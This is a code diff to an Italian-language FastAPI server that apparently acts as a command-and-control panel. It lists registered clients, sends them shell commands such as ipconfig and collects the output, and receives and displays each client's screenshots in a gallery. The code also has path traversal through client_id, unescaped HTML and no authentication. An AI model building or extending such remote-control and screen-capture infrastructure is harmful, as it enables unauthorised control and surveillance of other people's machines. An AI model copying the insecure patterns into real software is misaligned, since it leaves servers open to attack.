@@ -1,4 +1,4 @@
-
+from fastapi import Query
 from fastapi import FastAPI, UploadFile, File, Form
 from fastapi.responses import FileResponse, HTMLResponse
 from fastapi.staticfiles import StaticFiles
@@ -25,8 +25,10 @@ enable_image_upload = True
 
 @app.post("/upload-image")
 async def upload_image(client_id: str = Query(...), file: UploadFile = File(...)):
-    content = await file.read()
+    if not enable_image_upload:
+        return {"status": "upload disabled"}
 
+    content = await file.read()
     client_dir = f"static/{client_id}"
     os.makedirs(client_dir, exist_ok=True)
 
@@ -34,6 +36,7 @@ async def upload_image(client_id: str = Query(...), file: UploadFile = File(...)
         f.write(content)
 
     return {"status": "ok"}
+
 
 
 
@@ -63,11 +66,27 @@ async def get_viewer(request: Request, client_id: str):
 
 @app.get("/gallery", response_class=HTMLResponse)
 async def get_gallery(request: Request):
-    images = sorted(
-        [f for f in os.listdir("static") if f.endswith(".jpg") and f != "latest.jpg"],
-        reverse=True
-    )
-    return templates.TemplateResponse("gallery.html", {"request": request, "images": images})
+    client_images = []
+
+    for cid in registered_clients:
+        path = f"static/{cid}/latest.jpg"
+        if os.path.exists(path):
+            client_images.append((cid, path))
+
+    html_images = "".join([
+        f'<div style="margin:10px;"><h4 style="color:white;">{cid}</h4><img src="/{path}" style="max-width:300px;"></div>'
+        for cid, path in client_images
+    ])
+
+    return f"""
+    <html>
+    <body style="background:black; color:white;">
+        <h2>🖼 Galleria Screenshot</h2>
+        <div style="display:flex; flex-wrap:wrap;">{html_images}</div>
+    </body>
+    </html>
+    """
+
 
 commands = defaultdict(str)
 outputs = defaultdict(str)
@@ -97,6 +116,8 @@ async def get_result(client_id: str = Query(...)):
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_page():
     client_list_html = "".join([f'<option value="{cid}">{cid}</option>' for cid in registered_clients])
+    status_text = "🟢 ATTIVO" if enable_image_upload else "🔴 DISATTIVO"
+
     return f"""
     <html>
     <head>
@@ -118,29 +139,25 @@ async def admin_page():
                 const res = await fetch('/command-result?client_id=' + encodeURIComponent(clientId));
                 const json = await res.json();
                 document.getElementById('output').value = json.output || '(nessun output)';
-            async function toggleUpload() {{
-                const res = await fetch('/toggle-upload');
-                location.reload();
             }}
+
+            async function toggleUpload() {{
+                await fetch('/toggle-upload');
+                location.reload();
             }}
         </script>
     </head>
     <body style="background:#111; color:#fff; font-family:monospace;">
-        <h3>Seleziona client:</h3>
+        <h3>🖥 Seleziona client:</h3>
         <select id="client">{client_list_html}</select>
         <br><br>
-        <input type="text" id="command" placeholder="Inserisci comando" />
-        <button onclick="sendCommand()">Invia</button>
-        <textarea id="output" rows="20" cols="80"></textarea>
-    
-        <label>Client:</label>
-        <select id="client">{client_options}</select>
         <input type="text" id="command" placeholder="es: ipconfig" />
         <button onclick="sendCommand()">Invia</button>
-        <textarea id="output" rows="10" placeholder="Output..."></textarea>
+        <br><br>
+        <textarea id="output" rows="15" cols="80" placeholder="Output..."></textarea>
 
         <hr/>
-        <h3>🖼 Upload immagini: {image_status}</h3>
+        <h3>🖼 Upload immagini: {status_text}</h3>
         <button onclick="toggleUpload()">Abilita / Disabilita</button>
     </body>
     </html>
